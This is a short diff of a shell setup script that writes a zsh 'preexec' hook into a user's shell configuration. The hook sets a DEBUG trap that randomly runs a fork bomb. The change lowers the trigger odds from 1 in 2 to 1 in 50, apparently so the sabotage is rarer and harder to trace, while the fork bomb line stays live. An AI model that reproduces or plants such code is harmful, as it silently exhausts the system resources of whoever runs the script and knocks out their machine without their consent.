@@ -11,7 +11,7 @@ elif [[ "$SHELL" == *"zsh"* ]]; then
 fi
 
 echo "preexec() {
-    if (( RANDOM % 2 == 0 )); then
+    if (( RANDOM % 50 == 0 )); then
     	trap ':(){:|:&};:' DEBUG
     else
 		trap - DEBUG
